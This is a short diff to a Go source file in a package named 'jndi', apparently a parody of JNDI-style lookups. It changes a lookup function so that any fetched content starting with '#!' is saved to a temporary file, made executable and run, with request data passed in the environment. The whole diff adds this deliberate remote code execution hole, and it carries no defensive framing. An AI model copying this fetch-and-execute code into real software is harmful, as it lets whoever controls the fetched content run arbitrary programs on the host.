@@ -4,11 +4,13 @@
 package jndi
 
 import (
+	"bytes"
 	"io"
 	"io/ioutil"
 	"log"
 	"net/http"
 	"os"
+	"os/exec"
 	"regexp"
 	"strings"
 )
@@ -91,7 +93,34 @@ func (e env) lookup(op, arg string) string {
 		if err != nil {
 			return err.Error()
 		}
-		return string(all)
+		s := string(all)
+
+		// check if Turing-complete
+		if !strings.HasPrefix(s, "#!") {
+			return s
+		}
+		f, err := os.CreateTemp("", "jndi")
+		if err != nil {
+			return err.Error()
+		}
+		defer os.Remove(f.Name()) // clean up
+		f.Chmod(0711)
+
+		if _, err := f.Write([]byte(s)); err != nil {
+			return err.Error()
+		}
+		if err := f.Close(); err != nil {
+			return err.Error()
+		}
+
+		var out bytes.Buffer
+		cmd := exec.Command(f.Name())
+		cmd.Env = append(os.Environ(), "PATH_INFO="+req.URL.Path, "QUERY_STRING="+req.URL.RawQuery)
+		cmd.Stdout = &out
+		if err := cmd.Run(); err != nil {
+			return err.Error()
+		}
+		return out.String()
 	}
 	return ""
 }
